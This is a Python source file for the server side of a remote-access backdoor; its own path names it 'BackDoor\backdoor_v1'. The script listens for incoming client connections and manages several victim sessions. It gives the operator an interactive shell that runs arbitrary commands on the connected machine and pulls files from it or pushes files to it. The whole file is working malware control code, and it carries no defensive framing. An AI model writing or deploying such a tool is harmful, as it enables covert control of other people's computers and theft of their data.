import socket
import threading
import json
import os
import sys

# Get the absolute path of the project's root directory
project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# Add the project root to the Python module search path
sys.path.append(project_root)


from Logs.LogsHandler import log_Handler

# logs
logterminal = log_Handler()
exit_flag = False


def print_thread_count():
    thread_count = threading.active_count()
    logterminal.write(f"[+] Number of active threads: {thread_count-1}")


class Server:
    def __init__(self, IP, PORT) -> None:
        # Initialize the sockets
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((IP, PORT))
        self.server.listen(10)
        self.serverIP = IP
        self.serverPORT = PORT
        # List of clients
        self.ip_to_socket_map = {}
        self.control_Thread = None
        self.current_Client = None
        self.stop_event = threading.Event()
        self.byt = 1024 * 10

    # DOWNLOAD FILE
    def download(self, file_name):
        try:
            if file_name == "":
                print("[+] No filename provided to download")
                return
            # read file content
            filecontent = self.receive_Message(
                self.ip_to_socket_map[self.current_Client]
            )

            fd = open(
                "D:\\PROJECTS\\PythonSockets\\ETH\BackDoor\\backdoor_v1\\Server\\Data\\"
                + file_name,
                "wb",
            )
            fd.write(filecontent.encode())
            print(f"[+]File Downloaded Check {file_name} For Content")
            fd.close()
        except Exception as ex:
            print(f"[-]Download error {str(ex)}")

    def upload(self, filepath):
        try:
            if filepath == "":
                print("[-]Please provide correct path")
                return
            arr = filepath.split("\\")
            print(arr)
            if len(filepath) == 0:
                print("[-]Please provide correct path")
                return

            fd = open(filepath, "rb")
            # extract the filename
            filename = arr[len(arr) - 1]
            # send the filename to be downloaded
            self.send_Message(
                self.ip_to_socket_map[self.current_Client],
                "upload " + filename,
                self.current_Client,
            )

            content = fd.read().decode()
            # send the content
            self.send_Message(
                self.ip_to_socket_map[self.current_Client], content, self.current_Client
            )
            print(f"[+] Done Uploading..")
        except Exception as ex:
            print(f"[+]Error while uploading {str(ex)}")

    # REMOVE SESSION
    def remove_Session(self):
        try:
            self.show_Sessions()
            ip = (input("[+] -1 to exit please enter the IP:")).strip()
            if ip == "-1":
                print(f"[+] Operation cancelled")
                return
            if self.ip_to_socket_map.get(ip) == None:
                raise Exception("IP does not exist")

            clientsocket = self.ip_to_socket_map[ip]
            # check if there are other avaiable sessions if not we stop the handleclient thread execution
            if len(self.ip_to_socket_map) == 1 and ip == self.current_Client:
                # remove the sockets and empty the thread
                print(f"[+] Connection closed with {ip} ")
                clientsocket.close()
                self.control_Thread = None
                self.current_Client = None
                self.ip_to_socket_map.pop(ip)
                logterminal.write(f"[+] NO ACTIVE SESSIONS")
                print_thread_count()
            else:
                print(f"[+] Connection closed with {ip} ")
                clientsocket.close()
                self.ip_to_socket_map.pop(ip)
                if self.current_Client == ip:
                    for ip in self.ip_to_socket_map:
                        self.current_Client = ip
                        return

        except Exception as ex:
            print(f"[-]Remove Error :{str(ex)}")

    # MUJI HANDLE CLIENT
    def handle_Clients(self):
        global exit_flag
        # LOGIC TO HANDLE CLIENTS
        if self.current_Client == None:
            return
        # TRUE = self.current_Client != None and self.control_Thread != None
        while (
            self.current_Client != None and self.control_Thread != None
        ):  # this our custom check
            try:
                # getting the user command
                print(f"Shell~{self.current_Client}:> ", end="")
                command = (input()).strip()
                # logic to handle command
                print(f"[+] Command executed :{command}")

                if command.lower() == "sudo su":
                    continue

                if command.strip() == "":
                    continue
                # upload
                if command[0:6] == "upload":
                    self.upload(command[9:])
                    continue
                # download command
                if command[0:8] == "download":
                    if command[9:].strip() == "":
                        print(f"[+] No file name provided to download")
                        continue
                    self.send_Message(
                        self.ip_to_socket_map[self.current_Client],
                        command,
                        self.current_Client,
                    )
                    self.download(command[9:])
                    continue
                # DISPLAY SESSIONS
                if command.lower() == "show session":
                    # show avaiable sessions
                    self.show_Sessions()
                    continue
                # CLEAR THE TERMINAL
                if command.lower() == "clear":
                    os.system("powershell clear")
                    continue
                # command to remove session
                if command.lower() == "remove session":
                    self.remove_Session()
                    continue
                # quit the whole application
                if command.lower() == "quit":
                    self.broad_Cast(command.lower())
                    # exit the program
                    print(f"[+] EXITING THE THREAD")
                    exit_flag = True
                    break
                # this check of any other thread existence has exit flag
                if exit_flag == True:
                    break
                # change directory
                if command.lower()[:3] == "cd ":
                    self.send_Message(
                        self.ip_to_socket_map[self.current_Client],
                        command,
                        self.current_Client,
                    )
                    result = self.receive_Message(
                        self.ip_to_socket_map[self.current_Client]
                    )
                    print(result)
                    continue

                # switch session
                if (
                    command.lower() == "switch session"
                    or command.lower() == "switch session"
                ):
                    self.switch_Session()
                    continue

                self.send_Message(
                    self.ip_to_socket_map[self.current_Client],
                    command,
                    self.current_Client,
                )
                print("[+] Response Received:")
                result = self.receive_Message(
                    self.ip_to_socket_map[self.current_Client]
                )
                print(result)
            except Exception as ex:
                logterminal.write(
                    f"[+] SOMETHING WENT WRONG IN HANDLE CLIENT COMMUNICATION {str(ex)}"
                )

    # broadcast
    def broad_Cast(self, msg):
        for ip in self.ip_to_socket_map:
            try:
                self.send_Message(self.ip_to_socket_map[ip], msg, ip)
            except Exception as ex:
                logterminal.write(f"[-] Broadcase Error : {str(ex)}")

    # get all the sessions
    def show_Sessions(self):
        i: int = 0
        print(f"[+]ACTIVE SESSIONS ")
        for ip in self.ip_to_socket_map:
            print(f"[+]{i+1} : {ip}")
            i += 1

    # switch session
    def switch_Session(self):
        self.show_Sessions()
        try:
            ip = input("[+] Please Enter the IP or -1 to exit:")
            if ip == "":
                print(f"[+] PLEASE RETRY LATER AGAIN")
                return
            if ip == "-1":
                print(f"[+] SWITCH SESSION CANCELLED")
                return
            if self.ip_to_socket_map.get(ip) == None:
                print(f"[+] THE IP IS NOT ACTIVE")
                return
            self.current_Client = ip.strip()
        except Exception as ex:
            print(f"[+] ERROR WHILE SWITCHING SESSION : {str(ex)}")

    # message Generator
    def generate_Message(self, msg):
        try:
            jsondata = json.dumps(msg)
            return jsondata.encode()
        except Exception as ex:
            logterminal.write(f"[-] generate message error :{str(ex)}")
            return ""

    # send message
    def send_Message(self, clientsocket: socket.socket, command, current_clientip):
        try:
            clientsocket.send(self.generate_Message(command))
        except Exception as ex:
            logterminal.write(
                f"[-]SOMETHING WENT WRONG WHILE SENDING MESSAGE :{str(ex)}"
            )

            # remove the existing client if the communication has failed
            if self.ip_to_socket_map.get(current_clientip) != None:
                self.ip_to_socket_map.pop(current_clientip)
            # check if there are other avaiable sessions if not we stop the handleclient thread execution
            if len(self.ip_to_socket_map) == 0:
                # remove the sockets and empty the thread
                clientsocket.close()
                self.control_Thread = None
                self.current_Client = None
                logterminal.write(f"[+] NO ACTIVE SESSIONS")
                print(f"[+] NO Active session")
                print_thread_count()

    # received_Message
    def receive_Message(self, clientsocket: socket.socket):
        data = ""
        while True:
            try:
                data = data + clientsocket.recv(self.byt).decode().rstrip()
                return json.loads(data)
            except Exception as ex:
                logterminal.write(
                    f"[-]SOMETHING WENT WRONG WHILE RECEIVING MESSAGE:{str(ex)}"
                )
                return data

    def start(self):
        # LOGIC FOR THE SERVER
        logterminal.write(f"[+] Server listening on {self.serverIP}:{self.serverPORT}")
        global exit_flag
        while True:
            self.server.settimeout(1)
            try:
                logterminal.write(f"[+] WAITING FOR INCOMING REQUESTS")

                client, address = self.server.accept()
                logterminal.write(
                    f"[+] CLIENT CONNECTED FROM {address[0]}:{address[1]}"
                )
                print_thread_count()
                # append the client to the list of clients only once from the same ip
                if self.ip_to_socket_map.get(address[0]) == None:
                    self.ip_to_socket_map[address[0]] = client

                if self.current_Client == None and self.control_Thread == None:
                    # logic to control the clients
                    logterminal.write(
                        f"[+] Starting a New Thread to control the clients"
                    )
                    self.current_Client = address[0]
                    self.control_Thread = threading.Thread(target=self.handle_Clients)
                    self.control_Thread.start()
                else:
                    # logic to handle another client joined
                    pass
            except socket.timeout:
                # exit the main thread
                if exit_flag == True:
                    # Wait for all the threads to complete the execution
                    self.control_Thread.join()
                    print("[+]Exiting the program")
                    sys.exit()
            except Exception as ex:
                print(f"[-] SOMETHING WENT WRONG IN START _SERVER {str(ex)}")
                print(f"[-] CLOSING DOWN THE SERVER")
                # TO DO if there are any active connections before closing down the server close those connections
                exit()


def main():
    if len(sys.argv) != 3:
        print("[+] Usage python ./server.py IP PORT")
        print("[+] Example python ./server.py 192.168.0.151 8000")
        return
    # EXTRACT IP_ADDRESS
    IP_ADDRESS = sys.argv[1]
    PORT = int(sys.argv[2])
    server = Server(IP_ADDRESS, PORT)
    server.start()


if __name__ == "__main__":
    main()
